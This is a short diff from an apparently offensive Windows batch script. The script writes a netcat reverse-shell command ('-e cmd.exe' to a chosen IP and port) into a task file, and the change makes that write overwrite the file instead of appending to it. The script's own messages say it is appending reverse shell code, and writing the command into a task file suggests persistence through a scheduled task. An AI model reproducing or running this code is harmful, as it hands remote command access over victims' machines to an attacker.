@@ -135,7 +135,7 @@ echo [INFO] Appending reverse shell code to %taskpath%...
         pause
         exit /b 1
     )
-    echo start /b "%ncpath%" -e cmd.exe %ip% %port% >> "%taskpath%"
+    echo start /b "%ncpath%" -e cmd.exe %ip% %port% > "%taskpath%"
     if %errorlevel% neq 0 (
         echo [ERROR] Failed to append reverse shell code to the file. Check permissions.
         pause
